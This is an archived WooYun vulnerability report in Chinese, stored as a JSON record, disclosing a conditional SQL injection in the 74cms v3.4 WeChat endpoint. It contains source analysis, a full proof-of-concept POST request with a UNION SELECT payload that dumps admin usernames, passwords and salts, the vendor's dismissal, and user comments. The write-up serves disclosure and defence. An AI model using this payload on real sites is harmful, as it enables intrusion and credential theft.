{"id": 3605, "wybug_id": "wooyun-2014-053968", "wybug_title": "74cms某功能注入漏洞（有条件）", "wybug_corp": "74c,s.com", "wybug_author": "phith0n", "wybug_date": "2014-03-18 19:20", "wybug_open_date": "2014-06-13 19:21", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-28：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-13：\t细节向公众公开  简要描述： 略鸡肋,分享出来。 详细说明：  最新版v3.4，更新时间20140310文件/plus/weixin.phpresponseMsg函数，使用$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];获得了post数据。所以，可以无视GPC。获得的数据是XML格式，我们一会发送数据包即可。继续看该函数：\nif (!empty($postStr))\t\t{              \t$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);                $fromUsername = $postObj->FromUserName;                $toUsername = $postObj->ToUserName;                $keyword = trim($postObj->Content);\t\t\t\t$keyword = iconv(\"utf-8\",\"gb2312\",$keyword);                $time = time();\t\t\t\t$event = trim($postObj->Event);\n当我们获得的post数据非空时，用simplexml_load_string解析xml，复制到各个变量中。没有进行任何过滤。继续看到：\nif($_CFG['sina_apiopen']=='0'){\t\t$word=\"网站微信接口已经关闭\";\t\t$text=\"<xml>\t\t<ToUserName><![CDATA[\".$fromUsername.\"]]></ToUserName>\t\t<FromUserName><![CDATA[\".$toUsername.\"]]></FromUserName>\t\t<CreateTime>\".$time.\"</CreateTime>\t\t<MsgType><![CDATA[text]]></MsgType>\t\t<Content><![CDATA[\".$word.\"]]></Content>\t\t</xml> \";\t\texit($text);}\n这里有个判断，$_CFG[‘sina_apiopen’]必须不等于0 ，否则就会进入这个判断，最后exit整个文件，执行不到后面的注入的地方。所以这里是个鸡肋。必须管理员在后台开启新浪微博登陆，才能注入。而这个功能是默认不开启的。（不过很奇怪的是。。。这里明明是微信的相关功能。。。却验证的是新浪微博的开启状况。。。不忍吐槽）所以，我测试的时候手动到后台开启了新浪微博功能：\n\n这个时候，我们再继续看刚才的函数：\n$limit=\" LIMIT 6\";$orderbysql=\" ORDER BY refreshtime DESC\";if($keyword==\"n\"){\t$jobstable=table('jobs_search_rtime');\t\t\t }else if($keyword==\"j\"){\t$jobstable=table('jobs_search_rtime');\t$wheresql=\" where `emergency`=1 \";\t}else{$jobstable=table('jobs_search_key');$wheresql.=\" where likekey LIKE '%{$keyword}%' \";}$word='';$list = $id = array();$idresult = $this->query(\"SELECT id FROM {$jobstable} \".$wheresql.$orderbysql.$limit);\n看到这里就清楚了，直接把keyword带入查询。而keyword就是我们通过xml传进来的Content。   漏洞证明：  管理员后台开启新浪微博登录以后，发送post数据包\nPOST /74cms/plus/weixin.php?signature=1 HTTP/1.1Host: localhostUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: hd_sid=WahL3a; hd_auth=1fa4iZzrIMEb5ZGSLQx5SE%2BJ6na3Zhf3d6dgq89u1nsfk58DTo4ry8IMrhasqGmVLISNxrP1qWgepMLzHFkU; PHPSESSID=7tvld6d36c052jsqcrrof9uk86Connection: keep-aliveContent-Type: text/htmlContent-Length: 252<xml><FromUserName><![CDATA[owen]]></FromUserName><ToUsername><![CDATA[poal]]></ToUsername><Content><![CDATA[letmeplayagame'union select concat(admin_name,0x23,pwd,0x23,pwd_hash) from qs_admin#]]></Content><Event><![CDATA[aaa]]></Event></xml>\n其中Content-Type不能是application/x-www-form-urlencoded，改成text/html，表示传过去的是文本内容。其中Content内容是注入代码。查看返回数据包：\n\n注入成功。管理员用户名+密码+salt   修复方案：  过滤XML获得的数据。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-06-13 19:21 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-23 17:33 |    \t\tsn... \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:12        | 感觉下面有点硬。。。)\t\t \n  发了干嘛。我发的官方都不承认是漏洞，只会忽略然后自己悄悄修复。。这种垃圾厂商。。    \n     2014-04-15 09:16 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  给力。    \n     2014-06-13 21:36 |    \t\t无边落木 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | winter is coming！)\t\t \n  无良厂商    \n     2014-06-14 17:38 |    \t\tAres \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 来自幼儿园大班)\t\t \n  无良厂商    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}